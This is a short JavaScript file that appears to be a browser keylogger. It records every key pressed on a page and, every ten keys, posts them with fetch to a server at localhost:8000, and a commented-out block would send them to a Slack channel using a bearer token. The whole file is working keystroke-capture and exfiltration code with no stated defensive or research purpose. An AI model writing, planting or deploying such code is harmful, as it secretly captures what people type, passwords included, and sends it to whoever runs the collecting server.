let log = [];

document.addEventListener('keydown', (event) => {
    
    log.push(event.key);

    if (log.length >= 10) {
        // console.log(log);
        goPalantir(log);
        log = [];
    }
});

async function goPalantir(load) {
    try {
        await load.join("");
        await console.log(load);
        // fetch('https://slack.com/api/chat.postMessage', {
        //     method: 'POST',
        //     headers: {
        //         'Authorization': `Bearer ${token}`,
        //         'Content-Type': 'application/json'
        //     },
        //     body: JSON.stringify({
        //         channel: `C0BNS59V22V`,
        //         text: load,
        //     })
        // })
        await fetch('http://localhost:8000', {
            method: 'POST',
            // mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
                // 'Content-Type': 'text/plain'
            },
            body: JSON.stringify({
                text: load
            })
        });
    } catch (error) {
        console.log(`failed to palantir 💔, error ${error}`);
    };
};